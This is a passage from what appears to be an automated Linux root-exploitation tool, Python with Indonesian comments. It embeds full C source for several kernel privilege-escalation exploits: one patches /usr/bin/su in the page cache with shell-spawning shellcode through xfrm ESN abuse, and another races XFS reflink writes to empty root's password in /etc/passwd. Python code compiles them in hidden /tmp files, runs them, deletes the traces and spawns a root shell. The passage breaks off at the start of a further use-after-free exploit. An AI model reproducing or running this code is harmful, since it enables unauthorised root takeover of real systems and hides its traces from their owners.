def try_dirtyfrag():
    log("\n[=== METHOD 4: DirtyFrag (ESP + RxRPC auto-chain) ===]")

    # 1. cek kalau sudah patched dari sebelumnya
    if _check_su_patched():
        log("[+] /usr/bin/su already patched — exec")
        auto_root_exec("/usr/bin/su")
        return True
    if _check_passwd_patched():
        log("[+] /etc/passwd already patched — su root")
        auto_root_su("root")
        return True

    # 2. coba binary pre-built dulu (kalau ada)
    binary = None
    for p in ["/tmp/.df", "/tmp/.dirtyfrag"]:
        if os.path.isfile(p) and os.access(p, os.X_OK):
            binary = p
            break

    if binary:
        log("[*] Running pre-built DirtyFrag: %s" % binary)
        pid = os.fork()
        if pid == 0:
            try:
                _reattach_tty()
            except Exception:
                pass
            os.execv(binary, [binary])
            os._exit(1)
        _, status = os.waitpid(pid, 0)
        rc = os.WEXITSTATUS(status) if os.WIFEXITED(status) else -1
        if rc == 0 or _check_su_patched() or _check_passwd_patched():
            log("[+++] DirtyFrag (pre-built) succeeded")
            if _check_su_patched():
                auto_root_exec("/usr/bin/su")
            else:
                auto_root_su("root")
            return True
        log("[-] pre-built failed (rc=%d), trying compile" % rc)

    # 3. compile dari source C yang di-embed
    if not DIRTYFRAG_C_SOURCE.strip() or "TEMPEL SOURCE C" in DIRTYFRAG_C_SOURCE:
        log("[-] DIRTYFRAG_C_SOURCE masih kosong — isi dulu source C-nya")
        return False

    if _dirtyfrag_compile_and_run():
        log("[+++] DirtyFrag (compiled) succeeded")
        if _check_su_patched():
            auto_root_exec("/usr/bin/su")
        else:
            auto_root_su("root")
        return True

    log("[-] DirtyFrag failed")
    return False

# ──────────────────────────────────────────────────
# METHOD 5: CVE-2026-43503 (DirtyClone — ESP xfrm ESN)
# ──────────────────────────────────────────────────

CVE_2026_43503_C_SOURCE = r'''
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif

#define ENC_PORT         4500
#define SEQ_VAL          200
#define REPLAY_SEQ       100
#define TARGET_PATH      "/usr/bin/su"
#define PATCH_OFFSET     0
#define PAYLOAD_LEN      192
#define ENTRY_OFFSET     0x78

static const uint8_t shell_elf[PAYLOAD_LEN] = {
    0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x02,0x00,0x3e,0x00,0x01,0x00,0x00,0x00,0x78,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x00,0x00,
    0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
    0x00,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
    0x0f,0x05,0xb0,0x69,0x0f,0x05,0xb0,0x74,0x0f,0x05,0x6a,0x00,0x48,0x8d,0x05,0x12,
    0x00,0x00,0x00,0x50,0x48,0x89,0xe2,0x48,0x8d,0x3d,0x12,0x00,0x00,0x00,0x31,0xf6,
    0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
    0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
};

extern int g_su_verbose;
int g_su_verbose = 0;
#define SLOG(fmt, ...) do { if (g_su_verbose) fprintf(stderr, "[su] " fmt "\n", ##__VA_ARGS__); } while (0)

static int write_proc(const char *path, const char *buf)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    int n = write(fd, buf, strlen(buf));
    close(fd);
    return n;
}

static void setup_userns_netns(void)
{
    uid_t real_uid = getuid();
    gid_t real_gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        SLOG("unshare: %s", strerror(errno));
        exit(1);
    }
    write_proc("/proc/self/setgroups", "deny");
    char map[64];
    snprintf(map, sizeof(map), "0 %u 1", real_uid);
    if (write_proc("/proc/self/uid_map", map) < 0) {
        SLOG("uid_map: %s", strerror(errno)); exit(1);
    }
    snprintf(map, sizeof(map), "0 %u 1", real_gid);
    if (write_proc("/proc/self/gid_map", map) < 0) {
        SLOG("gid_map: %s", strerror(errno)); exit(1);
    }
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) { SLOG("socket: %s", strerror(errno)); exit(1); }
    struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { SLOG("SIOCGIFFLAGS: %s", strerror(errno)); exit(1); }
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) { SLOG("SIOCSIFFLAGS: %s", strerror(errno)); exit(1); }
    close(s);
}

static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len)
{
    struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len  = RTA_LENGTH(len);
    memcpy(RTA_DATA(rta), data, len);
    nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

static int add_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
{
    int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
    if (sk < 0) return -1;
    struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
    if (bind(sk, (struct sockaddr*)&nl, sizeof(nl)) < 0) { close(sk); return -1; }

    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    nlh->nlmsg_type  = XFRM_MSG_NEWSA;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
    nlh->nlmsg_pid   = getpid();
    nlh->nlmsg_seq   = 1;
    nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

    struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
    xs->id.daddr.a4 = inet_addr("127.0.0.1");
    xs->id.spi      = htonl(spi);
    xs->id.proto    = IPPROTO_ESP;
    xs->saddr.a4    = inet_addr("127.0.0.1");
    xs->family      = AF_INET;
    xs->mode        = XFRM_MODE_TRANSPORT;
    xs->replay_window = 0;
    xs->reqid       = 0x1234;
    xs->flags       = XFRM_STATE_ESN;
    xs->lft.soft_byte_limit   = (uint64_t)-1;
    xs->lft.hard_byte_limit   = (uint64_t)-1;
    xs->lft.soft_packet_limit = (uint64_t)-1;
    xs->lft.hard_packet_limit = (uint64_t)-1;
    xs->sel.family  = AF_INET;
    xs->sel.prefixlen_d = 32;
    xs->sel.prefixlen_s = 32;
    xs->sel.daddr.a4 = inet_addr("127.0.0.1");
    xs->sel.saddr.a4 = inet_addr("127.0.0.1");

    {
        char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)alg_buf;
        strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name)-1);
        aa->alg_key_len   = 32 * 8;
        aa->alg_trunc_len = 128;
        memset(aa->alg_key, 0xAA, 32);
        put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
    }
    {
        char alg_buf[sizeof(struct xfrm_algo) + 16];
        memset(alg_buf, 0, sizeof(alg_buf));
        struct xfrm_algo *ea = (struct xfrm_algo *)alg_buf;
        strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name)-1);
        ea->alg_key_len = 16 * 8;
        memset(ea->alg_key, 0xBB, 16);
        put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
    }
    {
        struct xfrm_encap_tmpl enc;
        memset(&enc, 0, sizeof(enc));
        enc.encap_type  = UDP_ENCAP_ESPINUDP;
        enc.encap_sport = htons(ENC_PORT);
        enc.encap_dport = htons(ENC_PORT);
        enc.encap_oa.a4 = 0;
        put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
    }
    {
        char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
        memset(esn_buf, 0, sizeof(esn_buf));
        struct xfrm_replay_state_esn *esn = (struct xfrm_replay_state_esn *)esn_buf;
        esn->bmp_len       = 1;
        esn->oseq          = 0;
        esn->seq           = REPLAY_SEQ;
        esn->oseq_hi       = 0;
        esn->seq_hi        = patch_seqhi;
        esn->replay_window = 32;
        put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
    }

    if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) { close(sk); return -1; }
    char rbuf[4096];
    int n = recv(sk, rbuf, sizeof(rbuf), 0);
    if (n < 0) { close(sk); return -1; }
    struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
    if (rh->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *e = NLMSG_DATA(rh);
        if (e->error) { close(sk); return -1; }
    }
    close(sk);
    return 0;
}

static int do_one_write(const char *path, off_t offset, uint32_t spi)
{
    int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_recv < 0) return -1;
    int one = 1;
    setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in sa_d = {
        .sin_family = AF_INET,
        .sin_port   = htons(ENC_PORT),
        .sin_addr   = { inet_addr("127.0.0.1") },
    };
    if (bind(sk_recv, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
        close(sk_recv); return -1;
    }
    int encap = UDP_ENCAP_ESPINUDP;
    if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
        close(sk_recv); return -1;
    }
    int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
    if (sk_send < 0) { close(sk_recv); return -1; }
    if (connect(sk_send, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
        close(sk_send); close(sk_recv); return -1;
    }
    int file_fd = open(path, O_RDONLY);
    if (file_fd < 0) { close(sk_send); close(sk_recv); return -1; }

    int pfd[2];
    if (pipe(pfd) < 0) { close(file_fd); close(sk_send); close(sk_recv); return -1; }

    uint8_t hdr[24];
    *(uint32_t*)(hdr + 0) = htonl(spi);
    *(uint32_t*)(hdr + 4) = htonl(SEQ_VAL);
    memset(hdr + 8, 0xCC, 16);

    struct iovec iov_h = { .iov_base = hdr, .iov_len = sizeof(hdr) };
    if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t)sizeof(hdr)) {
        close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
    }
    off_t off = offset;
    ssize_t s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
    if (s != 16) {
        close(file_fd); close(pfd[0]); close(pfd[1]); close(sk_send); close(sk_recv); return -1;
    }
    s = splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);

    usleep(150 * 1000);

    close(file_fd); close(pfd[0]); close(pfd[1]);
    close(sk_send); close(sk_recv);
    return 0;
}

static int verify_byte(const char *path, off_t offset, uint8_t want)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    uint8_t got;
    if (pread(fd, &got, 1, offset) != 1) { close(fd); return -1; }
    close(fd);
    return got == want ? 0 : -1;
}

static int corrupt_su(void)
{
    setup_userns_netns();
    usleep(100 * 1000);

    for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
        uint32_t spi = 0xDEADBE10 + i;
        uint32_t seqhi =
            ((uint32_t)shell_elf[i*4 + 0] << 24) |
            ((uint32_t)shell_elf[i*4 + 1] << 16) |
            ((uint32_t)shell_elf[i*4 + 2] <<  8) |
            ((uint32_t)shell_elf[i*4 + 3]);
        if (add_xfrm_sa(spi, seqhi) < 0) {
            SLOG("add_xfrm_sa #%d failed", i);
            return -1;
        }
    }
    SLOG("installed %d xfrm SAs", PAYLOAD_LEN / 4);

    for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
        uint32_t spi = 0xDEADBE10 + i;
        off_t off = PATCH_OFFSET + i * 4;
        if (do_one_write(TARGET_PATH, off, spi) < 0) {
            SLOG("do_one_write #%d failed", i);
            return -1;
        }
    }
    SLOG("wrote %d bytes to %s", PAYLOAD_LEN, TARGET_PATH);
    return 0;
}

int su_lpe_main(int argc, char **argv)
{
    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "-v") || !strcmp(argv[i], "--verbose"))
            g_su_verbose = 1;
    }
    if (getenv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;

    pid_t cpid = fork();
    if (cpid < 0) return 1;
    if (cpid == 0) {
        int rc = corrupt_su();
        _exit(rc == 0 ? 0 : 2);
    }
    int cstatus;
    waitpid(cpid, &cstatus, 0);
    if (!WIFEXITED(cstatus) || WEXITSTATUS(cstatus) != 0) {
        SLOG("corruption stage failed");
        return 1;
    }

    if (verify_byte(TARGET_PATH, ENTRY_OFFSET, 0x31) != 0 ||
        verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) != 0) {
        SLOG("verify failed");
        return 1;
    }
    printf("[+] /usr/bin/su page-cache patched successfully!\n");
    return 0;
}

int main(int argc, char **argv)
{
    printf("=== DirtyClone (CVE-2026-43503) PoC by Ashraf Zaryouh \"0xBlackash\" ===\n");
    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());

    if (getuid() == 0) {
        execlp("/bin/sh", "sh", NULL);
        return 1;
    }

    int rc = su_lpe_main(argc, argv);
    if (rc == 0) {
        printf("[+] Success! Spawning root shell...\n");
        execl("/usr/bin/su", "su", "-c", "/bin/sh", NULL);
    }

    printf("[-] Exploit failed\n");
    return 1;
}
'''


def _cve_2026_43503_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _cve_2026_43503_compile_and_run():
    """Tulis source C, compile, jalankan. Return True kalau su patched."""
    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        log("[-] No gcc/cc — skip compile")
        return False
    log("[+] compiler: %s" % cc)

    tag = "%08x" % (os.getpid() ^ int(time.time()))
    c_path = "/tmp/.dc_%s.c" % tag
    bin_path = "/tmp/.dc_%s" % tag

    try:
        with open(c_path, "w") as f:
            f.write(CVE_2026_43503_C_SOURCE)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[*] compiling...")
    try:
        r = subprocess.run(
            [cc, "-O2", "-w", "-o", bin_path, c_path, "-pthread"],
            capture_output=True, timeout=300
        )
        if r.returncode != 0:
            err = r.stderr.decode(errors="replace")[:400]
            log("[-] compile failed: %s" % err)
            _cve_2026_43503_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] compile error: %s" % e)
        _cve_2026_43503_cleanup(c_path, bin_path)
        return False

    if not os.path.isfile(bin_path):
        log("[-] binary not produced")
        _cve_2026_43503_cleanup(c_path, bin_path)
        return False

    try:
        os.chmod(bin_path, 0o755)
    except OSError:
        pass
    log("[+] compiled: %s" % bin_path)

    log("[*] running DirtyClone (timeout 1200s)...")
    try:
        r = subprocess.run([bin_path], capture_output=True, timeout=1200)
        out = (r.stdout or b"") + (r.stderr or b"")
        out_s = out.decode(errors="replace")
        if out_s:
            for line in out_s.splitlines()[-20:]:
                log("    %s" % line)
    except subprocess.TimeoutExpired:
        log("[-] timeout")
        _cve_2026_43503_cleanup(c_path, bin_path)
        return False
    except Exception as e:
        log("[-] run error: %s" % e)
        _cve_2026_43503_cleanup(c_path, bin_path)
        return False

    _cve_2026_43503_cleanup(c_path, bin_path)

    if _check_su_patched():
        return True
    if "page-cache patched successfully" in out_s:
        return True
    return False


def try_cve_2026_43503():
    log("\n[=== METHOD 5: CVE-2026-43503 (DirtyClone — ESP xfrm ESN) ===]")

    # 1. cek kalau sudah patched dari sebelumnya
    if _check_su_patched():
        log("[+] /usr/bin/su already patched — exec root shell")
        _reattach_tty()
        os.execl("/usr/bin/su", "su", "-c", "/bin/sh")
        return True

    # 2. cek arsitektur
    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    # 3. compile & jalankan
    if _cve_2026_43503_compile_and_run():
        log("[+++] DirtyClone succes — /usr/bin/su patched")
        _reattach_tty()
        os.execl("/usr/bin/su", "su", "-c", "/bin/sh")
        return True

    log("[-] DirtyClone failed")
    return False

# ──────────────────────────────────────────────────
# METHOD 6: CVE-2026-64600 (RefluXFS — XFS reflink race)
# ──────────────────────────────────────────────────

CVE_2026_64600_C_SOURCE = r'''
/*
 * refluxfs.c - CVE-2026-64600 (RefluXFS) LPE PoC
 * Auto-detect scratch dir on same device as /etc/passwd.
 * Modified for Smoky M6 integration.
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <linux/fs.h>
#include <errno.h>
#include <stdint.h>
#include <time.h>

#define RACE_THREADS    32
#define TARGET_PATH     "/etc/passwd"
#define ALIGN_SIZE      4096
#define TRIES_PER_ROUND 256
#define WIDENER_THREADS 8

static int stop_flag = 0;
static pthread_barrier_t barrier;
static char *payload = NULL;
static size_t payload_size = 0;
static char g_scratch_dir[256] = "/var/tmp";

/* ---------- auto-detect scratch dir on same device as target ---------- */
static int pick_scratch_dir(void)
{
    struct stat st_target;
    if (stat(TARGET_PATH, &st_target) < 0)
        return -1;

    const char *candidates[] = {
        "/etc", "/var/tmp", "/tmp", "/var", "/run", "/dev/shm", NULL
    };
    for (int i = 0; candidates[i]; i++) {
        struct stat st;
        if (stat(candidates[i], &st) < 0) continue;
        if (st.st_dev != st_target.st_dev) continue;
        if (access(candidates[i], W_OK) != 0) continue;
        strncpy(g_scratch_dir, candidates[i], sizeof(g_scratch_dir) - 1);
        g_scratch_dir[sizeof(g_scratch_dir) - 1] = '\0';
        fprintf(stderr, "[+] scratch dir: %s (same dev as %s)\n",
                g_scratch_dir, TARGET_PATH);
        return 0;
    }
    /* fallback: use dirname of target */
    fprintf(stderr, "[-] no writable dir on same device as %s\n", TARGET_PATH);
    return -1;
}

/* ---------- Payload: strip the 'x' from root:x: -> root:: ---------- */
static int build_payload(void)
{
    int fd = open(TARGET_PATH, O_RDONLY);
    if (fd < 0) {
        perror("open target for reading");
        return -1;
    }

    struct stat st;
    if (fstat(fd, &st) < 0) {
        perror("fstat");
        close(fd);
        return -1;
    }

    payload_size = st.st_size;
    payload = malloc(payload_size);
    if (!payload) {
        perror("malloc payload");
        close(fd);
        return -1;
    }

    ssize_t n = read(fd, payload, payload_size);
    close(fd);
    if (n != (ssize_t)payload_size) {
        perror("read target");
        free(payload);
        payload = NULL;
        return -1;
    }

    /* Find "root:" line, remove the 'x' after colon -> root:: */
    char *root_line = strstr(payload, "root:");
    if (!root_line) {
        fprintf(stderr, "[-] could not find 'root:' in %s\n", TARGET_PATH);
        free(payload);
        payload = NULL;
        return -1;
    }
    /* root:x:0:0  ->  root::0:0
     * strstr finds "root:" at offset 0.
     * line[5] should be 'x', line[6] should be ':'
     * remove line[5] ('x'), shift rest left by 1
     */
    if (root_line[5] == 'x' && root_line[6] == ':') {
        size_t shift_from = (root_line - payload) + 5;
        size_t shift_len  = payload_size - shift_from - 1;
        memmove(root_line + 5, root_line + 6, shift_len);
        payload_size -= 1;
    } else if (root_line[5] == ':') {
        fprintf(stderr, "[+] root password already empty\n");
    } else {
        fprintf(stderr, "[-] unexpected /etc/passwd format\n");
        free(payload);
        payload = NULL;
        return -1;
    }

    fprintf(stderr, "[+] payload built (%zu bytes), root password will be cleared\n",
            payload_size);
    return 0;
}

/* ---------- Thread worker: race O_DIRECT writes ---------- */
typedef struct {
    int fd_clone;
    const char *buf;
    size_t len;
    off_t offset;
} thread_arg_t;

static void *race_thread(void *arg)
{
    thread_arg_t *ta = (thread_arg_t *)arg;
    pthread_barrier_wait(&barrier);
    ssize_t ret = pwrite(ta->fd_clone, ta->buf, ta->len, ta->offset);
    (void)ret;
    return NULL;
}

/* ---------- Background window-widener threads ---------- */
static void *widener_thread(void *arg)
{
    char path[512];
    int idx = *(int *)arg;
    snprintf(path, sizeof(path), "%s/.reflux_widen_%d", g_scratch_dir, idx);

    char buf[4096] = {0};

    while (!stop_flag) {
        int fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0644);
        if (fd < 0) { usleep(1000); continue; }
        write(fd, buf, sizeof(buf));
        fdatasync(fd);
        close(fd);
        usleep(100);
    }
    unlink(path);
    return NULL;
}

/* ---------- Main race primitive ---------- */
static int do_race_round(void)
{
    char scratch_path[512];
    static int round_id = 0;
    round_id++;
    snprintf(scratch_path, sizeof(scratch_path),
             "%s/.reflux_scratch_%d_%d", g_scratch_dir, getpid(), round_id);

    int fd_src = open(TARGET_PATH, O_RDONLY);
    if (fd_src < 0) return -1;

    int fd_clone = open(scratch_path, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if (fd_clone < 0) {
        close(fd_src);
        return -1;
    }

    if (ioctl(fd_clone, FICLONE, fd_src) < 0) {
        close(fd_clone);
        close(fd_src);
        unlink(scratch_path);
        return -1;
    }
    close(fd_src);

    char *aligned_buf;
    if (posix_memalign((void **)&aligned_buf, ALIGN_SIZE, ALIGN_SIZE) != 0) {
        close(fd_clone);
        unlink(scratch_path);
        return -1;
    }
    size_t copy_len = payload_size < ALIGN_SIZE ? payload_size : ALIGN_SIZE;
    memcpy(aligned_buf, payload, copy_len);

    int fd_race = open(scratch_path, O_RDWR | O_DIRECT);
    if (fd_race < 0) {
        free(aligned_buf);
        close(fd_clone);
        unlink(scratch_path);
        return -1;
    }
    close(fd_clone);

    pthread_t threads[RACE_THREADS];
    thread_arg_t args[RACE_THREADS];

    pthread_barrier_init(&barrier, NULL, RACE_THREADS);

    for (int i = 0; i < RACE_THREADS; i++) {
        args[i].fd_clone = fd_race;
        args[i].buf = aligned_buf;
        args[i].len = ALIGN_SIZE;
        args[i].offset = 0;
        pthread_create(&threads[i], NULL, race_thread, &args[i]);
    }

    for (int i = 0; i < RACE_THREADS; i++) {
        pthread_join(threads[i], NULL);
    }

    pthread_barrier_destroy(&barrier);
    close(fd_race);
    free(aligned_buf);

    int fd_target = open(TARGET_PATH, O_RDONLY);
    if (fd_target >= 0) {
        posix_fadvise(fd_target, 0, 0, POSIX_FADV_DONTNEED);
        close(fd_target);
    }
    unlink(scratch_path);
    return 0;
}

/* ---------- Check success ---------- */
static int check_exploit_success(void)
{
    FILE *fp = fopen(TARGET_PATH, "r");
    if (!fp) return 0;

    char line[512];
    int success = 0;
    while (fgets(line, sizeof(line), fp)) {
        if (strncmp(line, "root:", 5) == 0) {
            if (line[5] == ':') {
                success = 1;
                fprintf(stderr, "[!!!] EXPLOIT SUCCEEDED: root password field EMPTY\n");
            }
            break;
        }
    }
    fclose(fp);
    return success;
}

int main(int argc, char **argv)
{
    (void)argc; (void)argv;

    fprintf(stderr, "=== CVE-2026-64600 (RefluXFS) PoC ===\n");
    fprintf(stderr, "[*] uid=%d euid=%d\n", getuid(), geteuid());

    if (geteuid() == 0) {
        execlp("/bin/sh", "sh", NULL);
        return 1;
    }

    if (pick_scratch_dir() < 0) {
        fprintf(stderr, "[-] no scratch dir available\n");
        return 1;
    }

    if (build_payload() < 0) {
        fprintf(stderr, "[-] failed to build payload\n");
        return 1;
    }

    /* quick reflink test */
    {
        char tpath[512], cpath[512];
        snprintf(tpath, sizeof(tpath), "%s/.rx_test", g_scratch_dir);
        snprintf(cpath, sizeof(cpath), "%s/.rx_test_c", g_scratch_dir);
        int fd_t = open(tpath, O_RDWR|O_CREAT|O_TRUNC, 0644);
        if (fd_t >= 0) {
            write(fd_t, "test", 4);
            int fd_c = open(cpath, O_RDWR|O_CREAT|O_TRUNC, 0644);
            if (fd_c >= 0) {
                if (ioctl(fd_c, FICLONE, fd_t) < 0) {
                    fprintf(stderr, "[-] FICLONE not supported here\n");
                    close(fd_c); close(fd_t);
                    unlink(tpath); unlink(cpath);
                    return 1;
                }
                close(fd_c);
            }
            close(fd_t);
            unlink(tpath); unlink(cpath);
        }
    }

    fprintf(stderr, "[*] starting widener threads...\n");
    pthread_t wideners[WIDENER_THREADS];
    int widener_ids[WIDENER_THREADS];
    for (int i = 0; i < WIDENER_THREADS; i++) {
        widener_ids[i] = i;
        pthread_create(&wideners[i], NULL, widener_thread, &widener_ids[i]);
    }

    fprintf(stderr, "[*] race loop starting...\n");
    int rounds = 0;
    int success = 0;
    while (rounds < 10000 && !success && !stop_flag) {
        for (int i = 0; i < TRIES_PER_ROUND; i++) {
            if (do_race_round() == 0) rounds++;
        }
        success = check_exploit_success();
        if (success) break;
        if (rounds > 0 && rounds % 500 == 0)
            fprintf(stderr, "[*] %d rounds...\n", rounds);
    }

    stop_flag = 1;
    for (int i = 0; i < WIDENER_THREADS; i++) {
        pthread_join(wideners[i], NULL);
    }

    if (payload) free(payload);

    if (success) {
        fprintf(stderr, "[!!!] SUCCESS after %d rounds\n", rounds);
        return 0;
    }
    fprintf(stderr, "[-] failed after %d rounds\n", rounds);
    return 1;
}
'''

def _cve_2026_64600_cleanup(*paths):
    for p in paths:
        try:
            os.remove(p)
        except OSError:
            pass


def _cve_2026_64600_compile_and_run():
    """Tulis source C, compile, jalankan. Return True kalau /etc/passwd patched."""
    cc = shutil.which("gcc") or shutil.which("cc")
    if not cc:
        log("[-] No gcc/cc — skip compile")
        return False
    log("[+] compiler: %s" % cc)

    tag = "%08x" % (os.getpid() ^ int(time.time()))
    c_path = "/tmp/.rx_%s.c" % tag
    bin_path = "/tmp/.rx_%s" % tag

    try:
        with open(c_path, "w") as f:
            f.write(CVE_2026_64600_C_SOURCE)
    except OSError as e:
        log("[-] write source: %s" % e)
        return False

    log("[*] compiling...")
    try:
        r = subprocess.run(
            [cc, "-O2", "-w", "-o", bin_path, c_path, "-lpthread"],
            capture_output=True, timeout=300
        )
        if r.returncode != 0:
            err = r.stderr.decode(errors="replace")[:400]
            log("[-] compile failed: %s" % err)
            _cve_2026_64600_cleanup(c_path, bin_path)
            return False
    except Exception as e:
        log("[-] compile error: %s" % e)
        _cve_2026_64600_cleanup(c_path, bin_path)
        return False

    if not os.path.isfile(bin_path):
        log("[-] binary not produced")
        _cve_2026_64600_cleanup(c_path, bin_path)
        return False

    try:
        os.chmod(bin_path, 0o755)
    except OSError:
        pass
    log("[+] compiled: %s" % bin_path)

    log("[*] running RefluXFS (timeout 600s)...")
    try:
        r = subprocess.run([bin_path], capture_output=True, timeout=600)
        out = (r.stdout or b"") + (r.stderr or b"")
        out_s = out.decode(errors="replace")
        if out_s:
            for line in out_s.splitlines()[-30:]:
                log("    %s" % line)
    except subprocess.TimeoutExpired:
        log("[-] timeout")
        _cve_2026_64600_cleanup(c_path, bin_path)
        return False
    except Exception as e:
        log("[-] run error: %s" % e)
        _cve_2026_64600_cleanup(c_path, bin_path)
        return False

    _cve_2026_64600_cleanup(c_path, bin_path)

    # verifikasi: /etc/passwd mulai root::
    try:
        with open("/etc/passwd", "r") as f:
            if f.readline().startswith("root::"):
                return True
    except OSError:
        pass
    if "EXPLOIT SUCCEEDED" in out_s:
        return True
    return False


def try_cve_2026_64600():
    log("\n[=== METHOD 6: CVE-2026-64600 (RefluXFS — XFS reflink race) ===]")

    # 1. cek kalau sudah patched
    try:
        with open("/etc/passwd", "r") as f:
            if f.readline().startswith("root::"):
                log("[+] /etc/passwd already patched (root::) — su root")
                auto_root_su("root")
                return True
    except OSError:
        pass

    # 2. cek arsitektur
    arch = os.uname().machine
    if arch not in ("x86_64", "amd64"):
        log("[-] x86_64 only (got %s)" % arch)
        return False

    # 3. compile & jalankan
    if _cve_2026_64600_compile_and_run():
        log("[+++] RefluXFS succeeded — /etc/passwd patched")
        auto_root_su("root")
        return True

    log("[-] RefluXFS failed")
    return False

# ──────────────────────────────────────────────────
# METHOD 7: CVE-2026-46242 (Bad Epoll — UAF + AAR + AAW + ROP)
# ──────────────────────────────────────────────────

CVE_2026_46242_C_SOURCE = r'''
/*
 * CVE-2026-46242.c - Bad Epoll UAF race-condition exploit.
 * Affects v6.4 through v7.1-rc (before commit a6dc643c6931).
 *
 * Architecture:
 *   Phase 1: Race — timerfd IRQ stalls racer in __ep_remove
 *   Phase 2: Cross-cache reclamation (pipe-backed struct file)
 *   Phase 3: AAR via fdinfo + f_inode corruption
 *   Phase 4: AAW via f_op hijack (release callback)
